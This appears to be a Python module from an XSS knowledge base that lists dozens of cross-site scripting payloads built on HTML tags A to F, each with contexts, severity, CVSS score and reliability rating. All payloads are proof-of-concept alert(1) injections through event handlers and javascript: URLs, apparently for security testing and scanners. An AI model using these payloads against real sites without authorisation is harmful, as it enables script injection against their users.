#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

HTML Tag XSS Payloads - Basic Tags A-F
"""

from ..models import PayloadEntry


HTML_TAG_PAYLOADS_AF = {
    # A tag variations
    "tag_a_1": PayloadEntry(
        payload="<a href=javascript:alert(1)>click</a>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Anchor with javascript href",
        tags=["html", "anchor", "javascript"],
        reliability="high",
    ),
    "tag_a_2": PayloadEntry(
        payload="<a href='#' onclick=alert(1)>click</a>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Anchor with onclick",
        tags=["html", "anchor", "onclick"],
        reliability="high",
    ),
    "tag_a_3": PayloadEntry(
        payload="<a href='#' onmouseover=alert(1)>hover</a>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Anchor with onmouseover",
        tags=["html", "anchor", "onmouseover"],
        reliability="high",
    ),
    # Abbr tag
    "tag_abbr": PayloadEntry(
        payload="<abbr onclick=alert(1)>XSS</abbr>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Abbr with onclick",
        tags=["html", "abbr", "onclick"],
        reliability="high",
    ),
    # Address tag
    "tag_address": PayloadEntry(
        payload="<address onclick=alert(1)>Address</address>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Address with onclick",
        tags=["html", "address", "onclick"],
        reliability="high",
    ),
    # Area tag
    "tag_area": PayloadEntry(
        payload="<map name=x><area href=javascript:alert(1)></map><img usemap=#x src=x>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Area with javascript href",
        tags=["html", "area", "map"],
        reliability="medium",
    ),
    # Article tag
    "tag_article": PayloadEntry(
        payload="<article onclick=alert(1)>Article</article>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Article with onclick",
        tags=["html", "article", "onclick", "html5"],
        reliability="high",
    ),
    # Aside tag
    "tag_aside": PayloadEntry(
        payload="<aside onclick=alert(1)>Aside</aside>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Aside with onclick",
        tags=["html", "aside", "onclick", "html5"],
        reliability="high",
    ),
    # Audio tag
    "tag_audio_1": PayloadEntry(
        payload="<audio src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Audio with onerror",
        tags=["html", "audio", "onerror"],
        reliability="high",
    ),
    "tag_audio_2": PayloadEntry(
        payload="<audio onloadstart=alert(1)><source src=x></audio>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Audio with onloadstart",
        tags=["html", "audio", "onloadstart"],
        reliability="high",
    ),
    "tag_audio_3": PayloadEntry(
        payload="<audio controls ontimeupdate=alert(1)><source src=valid.mp3></audio>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Audio with ontimeupdate",
        tags=["html", "audio", "ontimeupdate"],
        reliability="medium",
    ),
    # B tag
    "tag_b": PayloadEntry(
        payload="<b onclick=alert(1)>Bold</b>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Bold with onclick",
        tags=["html", "b", "onclick"],
        reliability="high",
    ),
    # Bdi tag
    "tag_bdi": PayloadEntry(
        payload="<bdi onclick=alert(1)>Text</bdi>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Bdi with onclick",
        tags=["html", "bdi", "onclick", "html5"],
        reliability="high",
    ),
    # Bdo tag
    "tag_bdo": PayloadEntry(
        payload="<bdo dir=ltr onclick=alert(1)>Text</bdo>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Bdo with onclick",
        tags=["html", "bdo", "onclick"],
        reliability="high",
    ),
    # Blockquote tag
    "tag_blockquote": PayloadEntry(
        payload="<blockquote onclick=alert(1)>Quote</blockquote>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Blockquote with onclick",
        tags=["html", "blockquote", "onclick"],
        reliability="high",
    ),
    # Body tag
    "tag_body_1": PayloadEntry(
        payload="<body onload=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Body with onload",
        tags=["html", "body", "onload"],
        reliability="high",
    ),
    "tag_body_2": PayloadEntry(
        payload="<body onpageshow=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Body with onpageshow",
        tags=["html", "body", "onpageshow"],
        reliability="high",
    ),
    "tag_body_3": PayloadEntry(
        payload="<body onresize=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Body with onresize",
        tags=["html", "body", "onresize"],
        reliability="medium",
    ),
    "tag_body_4": PayloadEntry(
        payload="<body onscroll=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Body with onscroll",
        tags=["html", "body", "onscroll"],
        reliability="medium",
    ),
    "tag_body_5": PayloadEntry(
        payload="<body onbeforeunload=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Body with onbeforeunload",
        tags=["html", "body", "onbeforeunload"],
        reliability="medium",
    ),
    "tag_body_6": PayloadEntry(
        payload="<body onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Body with onerror",
        tags=["html", "body", "onerror"],
        reliability="medium",
    ),
    "tag_body_7": PayloadEntry(
        payload="<body onhashchange=alert(1)><a href=#x>click</a>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Body with onhashchange",
        tags=["html", "body", "onhashchange"],
        reliability="high",
    ),
    # Button tag
    "tag_button_1": PayloadEntry(
        payload="<button onclick=alert(1)>Click</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Button with onclick",
        tags=["html", "button", "onclick"],
        reliability="high",
    ),
    "tag_button_2": PayloadEntry(
        payload="<button onfocus=alert(1) autofocus>X</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Button with autofocus onfocus",
        tags=["html", "button", "autofocus", "onfocus"],
        reliability="high",
    ),
    "tag_button_3": PayloadEntry(
        payload="<form><button formaction=javascript:alert(1)>X</button></form>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Button with formaction javascript",
        tags=["html", "button", "formaction"],
        reliability="high",
    ),
    # Canvas tag
    "tag_canvas": PayloadEntry(
        payload="<canvas onclick=alert(1)>Canvas</canvas>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Canvas with onclick",
        tags=["html", "canvas", "onclick", "html5"],
        reliability="high",
    ),
    # Caption tag
    "tag_caption": PayloadEntry(
        payload="<table><caption onclick=alert(1)>Caption</caption></table>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Caption with onclick",
        tags=["html", "caption", "table", "onclick"],
        reliability="high",
    ),
    # Cite tag
    "tag_cite": PayloadEntry(
        payload="<cite onclick=alert(1)>Citation</cite>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Cite with onclick",
        tags=["html", "cite", "onclick"],
        reliability="high",
    ),
    # Code tag
    "tag_code": PayloadEntry(
        payload="<code onclick=alert(1)>Code</code>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Code with onclick",
        tags=["html", "code", "onclick"],
        reliability="high",
    ),
    # Col tag
    "tag_col": PayloadEntry(
        payload="<table><colgroup><col onclick=alert(1)></colgroup></table>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Col with onclick",
        tags=["html", "col", "table", "onclick"],
        reliability="medium",
    ),
    # Data tag
    "tag_data": PayloadEntry(
        payload="<data value=1 onclick=alert(1)>One</data>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Data with onclick",
        tags=["html", "data", "onclick", "html5"],
        reliability="high",
    ),
    # Datalist tag
    "tag_datalist": PayloadEntry(
        payload="<input list=x><datalist id=x onclick=alert(1)><option>XSS</option></datalist>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Datalist with onclick",
        tags=["html", "datalist", "onclick", "html5"],
        reliability="medium",
    ),
    # Dd tag
    "tag_dd": PayloadEntry(
        payload="<dl><dd onclick=alert(1)>Definition</dd></dl>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Dd with onclick",
        tags=["html", "dd", "onclick"],
        reliability="high",
    ),
    # Del tag
    "tag_del": PayloadEntry(
        payload="<del onclick=alert(1)>Deleted</del>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Del with onclick",
        tags=["html", "del", "onclick"],
        reliability="high",
    ),
    # Details tag
    "tag_details_1": PayloadEntry(
        payload="<details ontoggle=alert(1) open>Details</details>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Details with ontoggle",
        tags=["html", "details", "ontoggle", "html5"],
        reliability="high",
    ),
    "tag_details_2": PayloadEntry(
        payload="<details open onclick=alert(1)>Details</details>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Details with onclick",
        tags=["html", "details", "onclick", "html5"],
        reliability="high",
    ),
    # Dfn tag
    "tag_dfn": PayloadEntry(
        payload="<dfn onclick=alert(1)>Definition</dfn>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Dfn with onclick",
        tags=["html", "dfn", "onclick"],
        reliability="high",
    ),
    # Dialog tag
    "tag_dialog": PayloadEntry(
        payload="<dialog open onclick=alert(1)>Dialog</dialog>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Dialog with onclick",
        tags=["html", "dialog", "onclick", "html5"],
        reliability="high",
    ),
    # Div tag
    "tag_div": PayloadEntry(
        payload="<div onclick=alert(1)>Div</div>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Div with onclick",
        tags=["html", "div", "onclick"],
        reliability="high",
    ),
    # Dl tag
    "tag_dl": PayloadEntry(
        payload="<dl onclick=alert(1)><dt>Term</dt><dd>Def</dd></dl>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Dl with onclick",
        tags=["html", "dl", "onclick"],
        reliability="high",
    ),
    # Dt tag
    "tag_dt": PayloadEntry(
        payload="<dl><dt onclick=alert(1)>Term</dt></dl>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Dt with onclick",
        tags=["html", "dt", "onclick"],
        reliability="high",
    ),
    # Em tag
    "tag_em": PayloadEntry(
        payload="<em onclick=alert(1)>Emphasis</em>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Em with onclick",
        tags=["html", "em", "onclick"],
        reliability="high",
    ),
    # Embed tag
    "tag_embed": PayloadEntry(
        payload="<embed src=javascript:alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Embed with javascript src",
        tags=["html", "embed", "javascript"],
        reliability="medium",
    ),
    # Fieldset tag
    "tag_fieldset": PayloadEntry(
        payload="<fieldset onclick=alert(1)>Fieldset</fieldset>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Fieldset with onclick",
        tags=["html", "fieldset", "onclick"],
        reliability="high",
    ),
    # Figcaption tag
    "tag_figcaption": PayloadEntry(
        payload="<figure><figcaption onclick=alert(1)>Caption</figcaption></figure>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Figcaption with onclick",
        tags=["html", "figcaption", "onclick", "html5"],
        reliability="high",
    ),
    # Figure tag
    "tag_figure": PayloadEntry(
        payload="<figure onclick=alert(1)>Figure</figure>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Figure with onclick",
        tags=["html", "figure", "onclick", "html5"],
        reliability="high",
    ),
    # Footer tag
    "tag_footer": PayloadEntry(
        payload="<footer onclick=alert(1)>Footer</footer>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Footer with onclick",
        tags=["html", "footer", "onclick", "html5"],
        reliability="high",
    ),
}
